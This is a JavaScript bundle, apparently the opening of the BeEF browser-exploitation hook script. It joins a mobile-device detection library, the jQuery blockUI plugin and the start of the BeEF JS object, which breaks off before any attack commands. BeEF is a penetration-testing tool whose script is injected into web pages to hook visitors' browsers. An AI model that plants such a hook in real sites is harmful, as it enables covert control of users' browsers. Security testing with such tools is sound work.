var deviceBB = "blackberry";
var vndRIM = "vnd.rim"; //Detectable when BB devices emulate IE or Firefox
var deviceBBStorm = "blackberry95"; //Storm 1 and 2
var deviceBBBold = "blackberry97"; //Bold 97x0 (non-touch)
var deviceBBBoldTouch = "blackberry 99"; //Bold 99x0 (touchscreen)
var deviceBBTour = "blackberry96"; //Tour
var deviceBBCurve = "blackberry89"; //Curve 2
var deviceBBCurveTouch = "blackberry 938"; //Curve Touch 9380
var deviceBBTorch = "blackberry 98"; //Torch
var deviceBBPlaybook = "playbook"; //PlayBook tablet

var devicePalm = "palm";
var deviceWebOS = "webos"; //For Palm's line of WebOS devices
var deviceWebOShp = "hpwos"; //For HP's line of WebOS devices

var engineBlazer = "blazer"; //Old Palm browser
var engineXiino = "xiino";

var deviceKindle = "kindle"; //Amazon Kindle, eInk one
var engineSilk = "silk"; //Amazon's accelerated Silk browser for Kindle Fire

var vndwap = "vnd.wap";
var wml = "wml";

var deviceTablet = "tablet"; //Generic term for slate and tablet devices
var deviceBrew = "brew";
var deviceDanger = "danger";
var deviceHiptop = "hiptop";
var devicePlaystation = "playstation";
var deviceNintendoDs = "nitro";
var deviceNintendo = "nintendo";
var deviceWii = "wii";
var deviceXbox = "xbox";
var deviceArchos = "archos";

var engineOpera = "opera"; //Popular browser
var engineNetfront = "netfront"; //Common embedded OS browser
var engineUpBrowser = "up.browser"; //common on some phones
var engineOpenWeb = "openweb"; //Transcoding by OpenWave server
var deviceMidp = "midp"; //a mobile Java technology
var uplink = "up.link";
var engineTelecaQ = 'teleca q'; //a modern feature phone browser

var devicePda = "pda";
var mini = "mini";  //Some mobile browsers put 'mini' in their names.
var mobile = "mobile"; //Some mobile browsers put 'mobile' in their user agent strings.
var mobi = "mobi"; //Some mobile browsers put 'mobi' in their user agent strings.

var maemo = "maemo";
var linux = "linux";
var qtembedded = "qt embedded"; //for Sony Mylo and others
var mylocom2 = "com2"; //for Sony Mylo also

var manuSonyEricsson = "sonyericsson";
var manuericsson = "ericsson";
var manuSamsung1 = "sec-sgh";
var manuSony = "sony";
var manuHtc = "htc"; //Popular Android and WinMo manufacturer

var svcDocomo = "docomo";
var svcKddi = "kddi";
var svcVodafone = "vodafone";

var disUpdate = "update"; //pda vs. update

var uagent = "";
if (navigator && navigator.userAgent)
    uagent = navigator.userAgent.toLowerCase();

function DetectIphone()
{
   if (uagent.search(deviceIphone) > -1)
   {
      if (DetectIpad() || DetectIpod())
         return false;
      else
         return true;
   }
   else
      return false;
}

function DetectIpod()
{
   if (uagent.search(deviceIpod) > -1)
      return true;
   else
      return false;
}

function DetectIpad()
{
   if (uagent.search(deviceIpad) > -1  && DetectWebkit())
      return true;
   else
      return false;
}

function DetectIphoneOrIpod()
{
   if (uagent.search(deviceIphone) > -1 ||
       uagent.search(deviceIpod) > -1)
       return true;
    else
       return false;
}

function DetectIos()
{
   if (DetectIphoneOrIpod() || DetectIpad())
      return true;
   else
      return false;
}

function DetectAndroid()
{
   if ((uagent.search(deviceAndroid) > -1) || DetectGoogleTV())
      return true;
   if (uagent.search(deviceHtcFlyer) > -1)
      return true;
   else
      return false;
}

function DetectAndroidPhone()
{
   if (DetectAndroid() && (uagent.search(mobile) > -1))
      return true;
   if (DetectOperaAndroidPhone())
      return true;
   if (uagent.search(deviceHtcFlyer) > -1)
      return true;
   else
      return false;
}

function DetectAndroidTablet()
{
   if (!DetectAndroid())
      return false;

   if (DetectOperaMobile())
      return false;
   if (uagent.search(deviceHtcFlyer) > -1)
      return false;

   if (uagent.search(mobile) > -1)
      return false;
   else
      return true;
}


function DetectAndroidWebKit()
{
   if (DetectAndroid() && DetectWebkit())
      return true;
   else
      return false;
}


function DetectGoogleTV()
{
   if (uagent.search(deviceGoogleTV) > -1)
      return true;
   else
      return false;
}


function DetectWebkit()
{
   if (uagent.search(engineWebKit) > -1)
      return true;
   else
      return false;
}

function DetectS60OssBrowser()
{
   if (DetectWebkit())
   {
     if ((uagent.search(deviceS60) > -1 ||
          uagent.search(deviceSymbian) > -1))
        return true;
     else
        return false;
   }
   else
      return false;
}

function DetectSymbianOS()
{
   if (uagent.search(deviceSymbian) > -1 ||
       uagent.search(deviceS60) > -1 ||
       uagent.search(deviceS70) > -1 ||
       uagent.search(deviceS80) > -1 ||
       uagent.search(deviceS90) > -1)
      return true;
   else
      return false;
}

function DetectWindowsPhone7()
{
   if (uagent.search(deviceWinPhone7) > -1)
      return true;
   else
      return false;
}

function DetectWindowsMobile()
{
   if (DetectWindowsPhone7())
      return false;
   if (uagent.search(deviceWinMob) > -1 ||
       uagent.search(deviceIeMob) > -1 ||
       uagent.search(enginePie) > -1)
      return true;
   if ((uagent.search(devicePpc) > -1) &&
       !(uagent.search(deviceMacPpc) > -1))
      return true;
   if (uagent.search(manuHtc) > -1 &&
       uagent.search(deviceWindows) > -1)
      return true;
   else
      return false;
}

function DetectBlackBerry()
{
   if (uagent.search(deviceBB) > -1)
      return true;
   if (uagent.search(vndRIM) > -1)
      return true;
   else
      return false;
}

function DetectBlackBerryTablet()
{
   if (uagent.search(deviceBBPlaybook) > -1)
      return true;
   else
      return false;
}

function DetectBlackBerryWebKit()
{
   if (DetectBlackBerry() &&
       uagent.search(engineWebKit) > -1)
      return true;
   else
      return false;
}

function DetectBlackBerryTouch()
{
   if (DetectBlackBerry() &&
        ((uagent.search(deviceBBStorm) > -1) ||
        (uagent.search(deviceBBTorch) > -1) ||
        (uagent.search(deviceBBBoldTouch) > -1) ||
        (uagent.search(deviceBBCurveTouch) > -1) ))
      return true;
   else
      return false;
}

function DetectBlackBerryHigh()
{
   if (DetectBlackBerryWebKit())
      return false;
   if (DetectBlackBerry())
   {
     if (DetectBlackBerryTouch() ||
        uagent.search(deviceBBBold) > -1 ||
        uagent.search(deviceBBTour) > -1 ||
        uagent.search(deviceBBCurve) > -1)
        return true;
     else
        return false;
   }
   else
      return false;
}

function DetectBlackBerryLow()
{
   if (DetectBlackBerry())
   {
     if (DetectBlackBerryHigh() || DetectBlackBerryWebKit())
        return false;
     else
        return true;
   }
   else
      return false;
}


function DetectPalmOS()
{
   if (uagent.search(devicePalm) > -1 ||
       uagent.search(engineBlazer) > -1 ||
       uagent.search(engineXiino) > -1)
   {
     if (DetectPalmWebOS())
        return false;
     else
        return true;
   }
   else
      return false;
}

function DetectPalmWebOS()
{
   if (uagent.search(deviceWebOS) > -1)
      return true;
   else
      return false;
}

function DetectWebOSTablet()
{
   if (uagent.search(deviceWebOShp) > -1 &&
       uagent.search(deviceTablet) > -1)
      return true;
   else
      return false;
}

function DetectGarminNuvifone()
{
   if (uagent.search(deviceNuvifone) > -1)
      return true;
   else
      return false;
}


function DetectSmartphone()
{
   if (DetectIphoneOrIpod()
      || DetectAndroidPhone()
      || DetectS60OssBrowser()
      || DetectSymbianOS()
      || DetectWindowsMobile()
      || DetectWindowsPhone7()
      || DetectBlackBerry()
      || DetectPalmWebOS()
      || DetectPalmOS()
      || DetectGarminNuvifone())
      return true;

   return false;
};

function DetectArchos()
{
   if (uagent.search(deviceArchos) > -1)
      return true;
   else
      return false;
}

function DetectBrewDevice()
{
   if (uagent.search(deviceBrew) > -1)
      return true;
   else
      return false;
}

function DetectDangerHiptop()
{
   if (uagent.search(deviceDanger) > -1 ||
       uagent.search(deviceHiptop) > -1)
      return true;
   else
      return false;
}

function DetectMaemoTablet()
{
   if (uagent.search(maemo) > -1)
      return true;
   if ((uagent.search(linux) > -1)
       && (uagent.search(deviceTablet) > -1)
       && !DetectWebOSTablet()
       && !DetectAndroid())
      return true;
   else
      return false;
}

function DetectSonyMylo()
{
   if (uagent.search(manuSony) > -1)
   {
     if (uagent.search(qtembedded) > -1 ||
         uagent.search(mylocom2) > -1)
        return true;
     else
        return false;
   }
   else
      return false;
}

function DetectOperaMobile()
{
   if (uagent.search(engineOpera) > -1)
   {
     if (uagent.search(mini) > -1 ||
         uagent.search(mobi) > -1)
        return true;
     else
        return false;
   }
   else
      return false;
}

function DetectOperaAndroidPhone()
{
   if ((uagent.search(engineOpera) > -1) &&
      (uagent.search(deviceAndroid) > -1) &&
      (uagent.search(mobi) > -1))
      return true;
   else
      return false;
}

function DetectOperaAndroidTablet()
{
   if ((uagent.search(engineOpera) > -1) &&
      (uagent.search(deviceAndroid) > -1) &&
      (uagent.search(deviceTablet) > -1))
      return true;
   else
      return false;
}

function DetectSonyPlaystation()
{
   if (uagent.search(devicePlaystation) > -1)
      return true;
   else
      return false;
};

function DetectNintendo()
{
   if (uagent.search(deviceNintendo) > -1   ||
	uagent.search(deviceWii) > -1 ||
	uagent.search(deviceNintendoDs) > -1)
      return true;
   else
      return false;
};

function DetectXbox()
{
   if (uagent.search(deviceXbox) > -1)
      return true;
   else
      return false;
};

function DetectGameConsole()
{
   if (DetectSonyPlaystation())
      return true;
   if (DetectNintendo())
      return true;
   if (DetectXbox())
      return true;
   else
      return false;
};

function DetectKindle()
{
   if (uagent.search(deviceKindle) > -1 &&
       !DetectAndroid())
      return true;
   else
      return false;
}

function DetectAmazonSilk()
{
   if (uagent.search(engineSilk) > -1)
      return true;
   else
      return false;
}

function DetectMobileQuick()
{
   if (DetectTierTablet())
      return false;

   if (DetectSmartphone())
      return true;

   if (uagent.search(deviceMidp) > -1 ||
	DetectBrewDevice())
      return true;

   if (DetectOperaMobile())
      return true;

   if (uagent.search(engineNetfront) > -1)
      return true;
   if (uagent.search(engineUpBrowser) > -1)
      return true;
   if (uagent.search(engineOpenWeb) > -1)
      return true;

   if (DetectDangerHiptop())
      return true;

   if (DetectMaemoTablet())
      return true;
   if (DetectArchos())
      return true;

   if ((uagent.search(devicePda) > -1) &&
        !(uagent.search(disUpdate) > -1))
      return true;
   if (uagent.search(mobile) > -1)
      return true;

   if (DetectKindle() ||
       DetectAmazonSilk())
      return true;

   return false;
};


function DetectMobileLong()
{
   if (DetectMobileQuick())
      return true;
   if (DetectGameConsole())
      return true;
   if (DetectSonyMylo())
      return true;

   if (uagent.search(manuSamsung1) > -1 ||
	uagent.search(manuSonyEricsson) > -1 ||
	uagent.search(manuericsson) > -1)
      return true;

   if (uagent.search(svcDocomo) > -1)
      return true;
   if (uagent.search(svcKddi) > -1)
      return true;
   if (uagent.search(svcVodafone) > -1)
      return true;


   return false;
};


function DetectTierTablet()
{
   if (DetectIpad()
        || DetectAndroidTablet()
        || DetectBlackBerryTablet()
        || DetectWebOSTablet())
      return true;
   else
      return false;
};

function DetectTierIphone()
{
   if (DetectIphoneOrIpod())
      return true;
   if (DetectAndroidPhone())
      return true;
   if (DetectBlackBerryWebKit() && DetectBlackBerryTouch())
      return true;
   if (DetectWindowsPhone7())
      return true;
   if (DetectPalmWebOS())
      return true;
   if (DetectGarminNuvifone())
      return true;
   else
      return false;
};

function DetectTierRichCss()
{
    if (DetectMobileQuick())
    {
       if (DetectTierIphone() || DetectKindle())
          return false;

       if (DetectWebkit())
          return true;
       if (DetectS60OssBrowser())
          return true;

       if (DetectBlackBerryHigh())
          return true;

       if (DetectWindowsMobile())
          return true;

       if (uagent.search(engineTelecaQ) > -1)
          return true;

       else
          return false;
    }
    else
      return false;
};

function DetectTierOtherPhones()
{
    if (DetectMobileLong())
    {
       if (DetectTierIphone() || DetectTierRichCss())
          return false;

       else
          return true;
    }
    else
      return false;
};


function InitDeviceScan()
{
    isIphone = DetectIphoneOrIpod();
    isAndroidPhone = DetectAndroidPhone();
    isTierIphone = DetectTierIphone();
    isTierTablet = DetectTierTablet();

    isTierRichCss = DetectTierRichCss();
    isTierGenericMobile = DetectTierOtherPhones();
};

try {
   InitDeviceScan();
}catch(e){}


/*!
 * jQuery blockUI plugin
 * Version 2.70.0-2014.11.23
 * Requires jQuery v1.7 or later
 *
 * Examples at: http://malsup.com/jquery/block/
 * Copyright (c) 2007-2013 M. Alsup
 * Dual licensed under the MIT and GPL licenses:
 * http://www.opensource.org/licenses/mit-license.php
 * http://www.gnu.org/licenses/gpl.html
 *
 * Thanks to Amir-Hossein Sobhi for some excellent contributions!
 */

;(function() {
/*jshint eqeqeq:false curly:false latedef:false */
"use strict";

	function setup($) {
		$.fn._fadeIn = $.fn.fadeIn;

		var noOp = $.noop || function() {};

		// this bit is to ensure we don't call setExpression when we shouldn't (with extra muscle to handle
		// confusing userAgent strings on Vista)
		var msie = /MSIE/.test(navigator.userAgent);
		var ie6  = /MSIE 6.0/.test(navigator.userAgent) && ! /MSIE 8.0/.test(navigator.userAgent);
		var mode = document.documentMode || 0;
		var setExpr = $.isFunction( document.createElement('div').style.setExpression );

		// global $ methods for blocking/unblocking the entire page
		$.blockUI   = function(opts) { install(window, opts); };
		$.unblockUI = function(opts) { remove(window, opts); };

		// convenience method for quick growl-like notifications  (http://www.google.com/search?q=growl)
		$.growlUI = function(title, message, timeout, onClose) {
			var $m = $('<div class="growlUI"></div>');
			if (title) $m.append('<h1>'+title+'</h1>');
			if (message) $m.append('<h2>'+message+'</h2>');
			if (timeout === undefined) timeout = 3000;

			// Added by konapun: Set timeout to 30 seconds if this growl is moused over, like normal toast notifications
			var callBlock = function(opts) {
				opts = opts || {};

				$.blockUI({
					message: $m,
					fadeIn : typeof opts.fadeIn  !== 'undefined' ? opts.fadeIn  : 700,
					fadeOut: typeof opts.fadeOut !== 'undefined' ? opts.fadeOut : 1000,
					timeout: typeof opts.timeout !== 'undefined' ? opts.timeout : timeout,
					centerY: false,
					showOverlay: false,
					onUnblock: onClose,
					css: $.blockUI.defaults.growlCSS
				});
			};

			callBlock();
			var nonmousedOpacity = $m.css('opacity');
			$m.mouseover(function() {
				callBlock({
					fadeIn: 0,
					timeout: 30000
				});

				var displayBlock = $('.blockMsg');
				displayBlock.stop(); // cancel fadeout if it has started
				displayBlock.fadeTo(300, 1); // make it easier to read the message by removing transparency
			}).mouseout(function() {
				$('.blockMsg').fadeOut(1000);
			});
			// End konapun additions
		};

		// plugin method for blocking element content
		$.fn.block = function(opts) {
			if ( this[0] === window ) {
				$.blockUI( opts );
				return this;
			}
			var fullOpts = $.extend({}, $.blockUI.defaults, opts || {});
			this.each(function() {
				var $el = $(this);
				if (fullOpts.ignoreIfBlocked && $el.data('blockUI.isBlocked'))
					return;
				$el.unblock({ fadeOut: 0 });
			});

			return this.each(function() {
				if ($.css(this,'position') == 'static') {
					this.style.position = 'relative';
					$(this).data('blockUI.static', true);
				}
				this.style.zoom = 1; // force 'hasLayout' in ie
				install(this, opts);
			});
		};

		// plugin method for unblocking element content
		$.fn.unblock = function(opts) {
			if ( this[0] === window ) {
				$.unblockUI( opts );
				return this;
			}
			return this.each(function() {
				remove(this, opts);
			});
		};

		$.blockUI.version = 2.70; // 2nd generation blocking at no extra cost!

		// override these in your code to change the default behavior and style
		$.blockUI.defaults = {
			// message displayed when blocking (use null for no message)
			message:  '<h1>Please wait...</h1>',

			title: null,		// title string; only used when theme == true
			draggable: true,	// only used when theme == true (requires jquery-ui.js to be loaded)

			theme: false, // set to true to use with jQuery UI themes

			// styles for the message when blocking; if you wish to disable
			// these and use an external stylesheet then do this in your code:
			// $.blockUI.defaults.css = {};
			css: {
				padding:	0,
				margin:		0,
				width:		'30%',
				top:		'40%',
				left:		'35%',
				textAlign:	'center',
				color:		'#000',
				border:		'3px solid #aaa',
				backgroundColor:'#fff',
				cursor:		'wait'
			},

			// minimal style set used when themes are used
			themedCSS: {
				width:	'30%',
				top:	'40%',
				left:	'35%'
			},

			// styles for the overlay
			overlayCSS:  {
				backgroundColor:	'#000',
				opacity:			0.6,
				cursor:				'wait'
			},

			// style to replace wait cursor before unblocking to correct issue
			// of lingering wait cursor
			cursorReset: 'default',

			// styles applied when using $.growlUI
			growlCSS: {
				width:		'350px',
				top:		'10px',
				left:		'',
				right:		'10px',
				border:		'none',
				padding:	'5px',
				opacity:	0.6,
				cursor:		'default',
				color:		'#fff',
				backgroundColor: '#000',
				'-webkit-border-radius':'10px',
				'-moz-border-radius':	'10px',
				'border-radius':		'10px'
			},

			// IE issues: 'about:blank' fails on HTTPS and javascript:false is s-l-o-w
			// (hat tip to Jorge H. N. de Vasconcelos)
			/*jshint scripturl:true */
			iframeSrc: /^https/i.test(window.location.href || '') ? 'javascript:false' : 'about:blank',

			// force usage of iframe in non-IE browsers (handy for blocking applets)
			forceIframe: false,

			// z-index for the blocking overlay
			baseZ: 1000,

			// set these to true to have the message automatically centered
			centerX: true, // <-- only effects element blocking (page block controlled via css above)
			centerY: true,

			// allow body element to be stetched in ie6; this makes blocking look better
			// on "short" pages.  disable if you wish to prevent changes to the body height
			allowBodyStretch: true,

			// enable if you want key and mouse events to be disabled for content that is blocked
			bindEvents: true,

			// be default blockUI will supress tab navigation from leaving blocking content
			// (if bindEvents is true)
			constrainTabKey: true,

			// fadeIn time in millis; set to 0 to disable fadeIn on block
			fadeIn:  200,

			// fadeOut time in millis; set to 0 to disable fadeOut on unblock
			fadeOut:  400,

			// time in millis to wait before auto-unblocking; set to 0 to disable auto-unblock
			timeout: 0,

			// disable if you don't want to show the overlay
			showOverlay: true,

			// if true, focus will be placed in the first available input field when
			// page blocking
			focusInput: true,

            // elements that can receive focus
            focusableElements: ':input:enabled:visible',

			// suppresses the use of overlay styles on FF/Linux (due to performance issues with opacity)
			// no longer needed in 2012
			// applyPlatformOpacityRules: true,

			// callback method invoked when fadeIn has completed and blocking message is visible
			onBlock: null,

			// callback method invoked when unblocking has completed; the callback is
			// passed the element that has been unblocked (which is the window object for page
			// blocks) and the options that were passed to the unblock call:
			//	onUnblock(element, options)
			onUnblock: null,

			// callback method invoked when the overlay area is clicked.
			// setting this will turn the cursor to a pointer, otherwise cursor defined in overlayCss will be used.
			onOverlayClick: null,

			// don't ask; if you really must know: http://groups.google.com/group/jquery-en/browse_thread/thread/36640a8730503595/2f6a79a77a78e493#2f6a79a77a78e493
			quirksmodeOffsetHack: 4,

			// class name of the message block
			blockMsgClass: 'blockMsg',

			// if it is already blocked, then ignore it (don't unblock and reblock)
			ignoreIfBlocked: false
		};

		// private data and functions follow...

		var pageBlock = null;
		var pageBlockEls = [];

		function install(el, opts) {
			var css, themedCSS;
			var full = (el == window);
			var msg = (opts && opts.message !== undefined ? opts.message : undefined);
			opts = $.extend({}, $.blockUI.defaults, opts || {});

			if (opts.ignoreIfBlocked && $(el).data('blockUI.isBlocked'))
				return;

			opts.overlayCSS = $.extend({}, $.blockUI.defaults.overlayCSS, opts.overlayCSS || {});
			css = $.extend({}, $.blockUI.defaults.css, opts.css || {});
			if (opts.onOverlayClick)
				opts.overlayCSS.cursor = 'pointer';

			themedCSS = $.extend({}, $.blockUI.defaults.themedCSS, opts.themedCSS || {});
			msg = msg === undefined ? opts.message : msg;

			// remove the current block (if there is one)
			if (full && pageBlock)
				remove(window, {fadeOut:0});

			// if an existing element is being used as the blocking content then we capture
			// its current place in the DOM (and current display style) so we can restore
			// it when we unblock
			if (msg && typeof msg != 'string' && (msg.parentNode || msg.jquery)) {
				var node = msg.jquery ? msg[0] : msg;
				var data = {};
				$(el).data('blockUI.history', data);
				data.el = node;
				data.parent = node.parentNode;
				data.display = node.style.display;
				data.position = node.style.position;
				if (data.parent)
					data.parent.removeChild(node);
			}

			$(el).data('blockUI.onUnblock', opts.onUnblock);
			var z = opts.baseZ;

			// blockUI uses 3 layers for blocking, for simplicity they are all used on every platform;
			// layer1 is the iframe layer which is used to supress bleed through of underlying content
			// layer2 is the overlay layer which has opacity and a wait cursor (by default)
			// layer3 is the message content that is displayed while blocking
			var lyr1, lyr2, lyr3, s;
			if (msie || opts.forceIframe)
				lyr1 = $('<iframe class="blockUI" style="z-index:'+ (z++) +';display:none;border:none;margin:0;padding:0;position:absolute;width:100%;height:100%;top:0;left:0" src="'+opts.iframeSrc+'"></iframe>');
			else
				lyr1 = $('<div class="blockUI" style="display:none"></div>');

			if (opts.theme)
				lyr2 = $('<div class="blockUI blockOverlay ui-widget-overlay" style="z-index:'+ (z++) +';display:none"></div>');
			else
				lyr2 = $('<div class="blockUI blockOverlay" style="z-index:'+ (z++) +';display:none;border:none;margin:0;padding:0;width:100%;height:100%;top:0;left:0"></div>');

			if (opts.theme && full) {
				s = '<div class="blockUI ' + opts.blockMsgClass + ' blockPage ui-dialog ui-widget ui-corner-all" style="z-index:'+(z+10)+';display:none;position:fixed">';
				if ( opts.title ) {
					s += '<div class="ui-widget-header ui-dialog-titlebar ui-corner-all blockTitle">'+(opts.title || '&nbsp;')+'</div>';
				}
				s += '<div class="ui-widget-content ui-dialog-content"></div>';
				s += '</div>';
			}
			else if (opts.theme) {
				s = '<div class="blockUI ' + opts.blockMsgClass + ' blockElement ui-dialog ui-widget ui-corner-all" style="z-index:'+(z+10)+';display:none;position:absolute">';
				if ( opts.title ) {
					s += '<div class="ui-widget-header ui-dialog-titlebar ui-corner-all blockTitle">'+(opts.title || '&nbsp;')+'</div>';
				}
				s += '<div class="ui-widget-content ui-dialog-content"></div>';
				s += '</div>';
			}
			else if (full) {
				s = '<div class="blockUI ' + opts.blockMsgClass + ' blockPage" style="z-index:'+(z+10)+';display:none;position:fixed"></div>';
			}
			else {
				s = '<div class="blockUI ' + opts.blockMsgClass + ' blockElement" style="z-index:'+(z+10)+';display:none;position:absolute"></div>';
			}
			lyr3 = $(s);

			// if we have a message, style it
			if (msg) {
				if (opts.theme) {
					lyr3.css(themedCSS);
					lyr3.addClass('ui-widget-content');
				}
				else
					lyr3.css(css);
			}

			// style the overlay
			if (!opts.theme /*&& (!opts.applyPlatformOpacityRules)*/)
				lyr2.css(opts.overlayCSS);
			lyr2.css('position', full ? 'fixed' : 'absolute');

			// make iframe layer transparent in IE
			if (msie || opts.forceIframe)
				lyr1.css('opacity',0.0);

			//$([lyr1[0],lyr2[0],lyr3[0]]).appendTo(full ? 'body' : el);
			var layers = [lyr1,lyr2,lyr3], $par = full ? $('body') : $(el);
			$.each(layers, function() {
				this.appendTo($par);
			});

			if (opts.theme && opts.draggable && $.fn.draggable) {
				lyr3.draggable({
					handle: '.ui-dialog-titlebar',
					cancel: 'li'
				});
			}

			// ie7 must use absolute positioning in quirks mode and to account for activex issues (when scrolling)
			var expr = setExpr && (!$.support.boxModel || $('object,embed', full ? null : el).length > 0);
			if (ie6 || expr) {
				// give body 100% height
				if (full && opts.allowBodyStretch && $.support.boxModel)
					$('html,body').css('height','100%');

				// fix ie6 issue when blocked element has a border width
				if ((ie6 || !$.support.boxModel) && !full) {
					var t = sz(el,'borderTopWidth'), l = sz(el,'borderLeftWidth');
					var fixT = t ? '(0 - '+t+')' : 0;
					var fixL = l ? '(0 - '+l+')' : 0;
				}

				// simulate fixed position
				$.each(layers, function(i,o) {
					var s = o[0].style;
					s.position = 'absolute';
					if (i < 2) {
						if (full)
							s.setExpression('height','Math.max(document.body.scrollHeight, document.body.offsetHeight) - (jQuery.support.boxModel?0:'+opts.quirksmodeOffsetHack+') + "px"');
						else
							s.setExpression('height','this.parentNode.offsetHeight + "px"');
						if (full)
							s.setExpression('width','jQuery.support.boxModel && document.documentElement.clientWidth || document.body.clientWidth + "px"');
						else
							s.setExpression('width','this.parentNode.offsetWidth + "px"');
						if (fixL) s.setExpression('left', fixL);
						if (fixT) s.setExpression('top', fixT);
					}
					else if (opts.centerY) {
						if (full) s.setExpression('top','(document.documentElement.clientHeight || document.body.clientHeight) / 2 - (this.offsetHeight / 2) + (blah = document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop) + "px"');
						s.marginTop = 0;
					}
					else if (!opts.centerY && full) {
						var top = (opts.css && opts.css.top) ? parseInt(opts.css.top, 10) : 0;
						var expression = '((document.documentElement.scrollTop ? document.documentElement.scrollTop : document.body.scrollTop) + '+top+') + "px"';
						s.setExpression('top',expression);
					}
				});
			}

			// show the message
			if (msg) {
				if (opts.theme)
					lyr3.find('.ui-widget-content').append(msg);
				else
					lyr3.append(msg);
				if (msg.jquery || msg.nodeType)
					$(msg).show();
			}

			if ((msie || opts.forceIframe) && opts.showOverlay)
				lyr1.show(); // opacity is zero
			if (opts.fadeIn) {
				var cb = opts.onBlock ? opts.onBlock : noOp;
				var cb1 = (opts.showOverlay && !msg) ? cb : noOp;
				var cb2 = msg ? cb : noOp;
				if (opts.showOverlay)
					lyr2._fadeIn(opts.fadeIn, cb1);
				if (msg)
					lyr3._fadeIn(opts.fadeIn, cb2);
			}
			else {
				if (opts.showOverlay)
					lyr2.show();
				if (msg)
					lyr3.show();
				if (opts.onBlock)
					opts.onBlock.bind(lyr3)();
			}

			// bind key and mouse events
			bind(1, el, opts);

			if (full) {
				pageBlock = lyr3[0];
				pageBlockEls = $(opts.focusableElements,pageBlock);
				if (opts.focusInput)
					setTimeout(focus, 20);
			}
			else
				center(lyr3[0], opts.centerX, opts.centerY);

			if (opts.timeout) {
				// auto-unblock
				var to = setTimeout(function() {
					if (full)
						$.unblockUI(opts);
					else
						$(el).unblock(opts);
				}, opts.timeout);
				$(el).data('blockUI.timeout', to);
			}
		}

		// remove the block
		function remove(el, opts) {
			var count;
			var full = (el == window);
			var $el = $(el);
			var data = $el.data('blockUI.history');
			var to = $el.data('blockUI.timeout');
			if (to) {
				clearTimeout(to);
				$el.removeData('blockUI.timeout');
			}
			opts = $.extend({}, $.blockUI.defaults, opts || {});
			bind(0, el, opts); // unbind events

			if (opts.onUnblock === null) {
				opts.onUnblock = $el.data('blockUI.onUnblock');
				$el.removeData('blockUI.onUnblock');
			}

			var els;
			if (full) // crazy selector to handle odd field errors in ie6/7
				els = $('body').children().filter('.blockUI').add('body > .blockUI');
			else
				els = $el.find('>.blockUI');

			// fix cursor issue
			if ( opts.cursorReset ) {
				if ( els.length > 1 )
					els[1].style.cursor = opts.cursorReset;
				if ( els.length > 2 )
					els[2].style.cursor = opts.cursorReset;
			}

			if (full)
				pageBlock = pageBlockEls = null;

			if (opts.fadeOut) {
				count = els.length;
				els.stop().fadeOut(opts.fadeOut, function() {
					if ( --count === 0)
						reset(els,data,opts,el);
				});
			}
			else
				reset(els, data, opts, el);
		}

		// move blocking element back into the DOM where it started
		function reset(els,data,opts,el) {
			var $el = $(el);
			if ( $el.data('blockUI.isBlocked') )
				return;

			els.each(function(i,o) {
				// remove via DOM calls so we don't lose event handlers
				if (this.parentNode)
					this.parentNode.removeChild(this);
			});

			if (data && data.el) {
				data.el.style.display = data.display;
				data.el.style.position = data.position;
				data.el.style.cursor = 'default'; // #59
				if (data.parent)
					data.parent.appendChild(data.el);
				$el.removeData('blockUI.history');
			}

			if ($el.data('blockUI.static')) {
				$el.css('position', 'static'); // #22
			}

			if (typeof opts.onUnblock == 'function')
				opts.onUnblock(el,opts);

			// fix issue in Safari 6 where block artifacts remain until reflow
			var body = $(document.body), w = body.width(), cssW = body[0].style.width;
			body.width(w-1).width(w);
			body[0].style.width = cssW;
		}

		// bind/unbind the handler
		function bind(b, el, opts) {
			var full = el == window, $el = $(el);

			// don't bother unbinding if there is nothing to unbind
			if (!b && (full && !pageBlock || !full && !$el.data('blockUI.isBlocked')))
				return;

			$el.data('blockUI.isBlocked', b);

			// don't bind events when overlay is not in use or if bindEvents is false
			if (!full || !opts.bindEvents || (b && !opts.showOverlay))
				return;

			// bind anchors and inputs for mouse and key events
			var events = 'mousedown mouseup keydown keypress keyup touchstart touchend touchmove';
			if (b)
				$(document).bind(events, opts, handler);
			else
				$(document).unbind(events, handler);

		// former impl...
		//		var $e = $('a,:input');
		//		b ? $e.bind(events, opts, handler) : $e.unbind(events, handler);
		}

		// event handler to suppress keyboard/mouse events when blocking
		function handler(e) {
			// allow tab navigation (conditionally)
			if (e.type === 'keydown' && e.keyCode && e.keyCode == 9) {
				if (pageBlock && e.data.constrainTabKey) {
					var els = pageBlockEls;
					var fwd = !e.shiftKey && e.target === els[els.length-1];
					var back = e.shiftKey && e.target === els[0];
					if (fwd || back) {
						setTimeout(function(){focus(back);},10);
						return false;
					}
				}
			}
			var opts = e.data;
			var target = $(e.target);
			if (target.hasClass('blockOverlay') && opts.onOverlayClick)
				opts.onOverlayClick(e);

			// allow events within the message content
			if (target.parents('div.' + opts.blockMsgClass).length > 0)
				return true;

			// allow events for content that is not being blocked
			return target.parents().children().filter('div.blockUI').length === 0;
		}

		function focus(back) {
			if (!pageBlockEls)
				return;
			var e = pageBlockEls[back===true ? pageBlockEls.length-1 : 0];
			if (e)
				e.focus();
		}

		function center(el, x, y) {
			var p = el.parentNode, s = el.style;
			var l = ((p.offsetWidth - el.offsetWidth)/2) - sz(p,'borderLeftWidth');
			var t = ((p.offsetHeight - el.offsetHeight)/2) - sz(p,'borderTopWidth');
			if (x) s.left = l > 0 ? (l+'px') : '0';
			if (y) s.top  = t > 0 ? (t+'px') : '0';
		}

		function sz(el, p) {
			return parseInt($.css(el,p),10)||0;
		}

	}


	/*global define:true */
	if (typeof define === 'function' && define.amd && define.amd.jQuery) {
		define(['jquery'], setup);
	} else {
		setup(jQuery);
	}

})();


//
// Copyright (c) 2006-2015 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * BeEF JS Library 0.4.7.0-alpha
 * Register the BeEF JS on the window object.
 */

$j = jQuery.noConflict();

if(typeof beef === 'undefined' && typeof window.beef === 'undefined') {
	
	var BeefJS = {
		
		version: '0.4.7.0-alpha',
		
		// This get set to true during window.onload(). It's a useful hack when messing with document.write().
		pageIsLoaded: false,
		
		// An array containing functions to be executed by the window.onpopstate() method.
		onpopstate: new Array(),
		
		// An array containing functions to be executed by the window.onclose() method.
		onclose: new Array(),
		
		// An array containing functions to be executed by Beef.
		commands: new Array(),
		
		// An array containing all the BeEF JS components.
		components: new Array(),

                /**
                 * Adds a function to display debug messages (wraps console.log())
                 * @param: {string} the debug string to return
                 */
                debug: function(msg) {
                    if (!false) return;
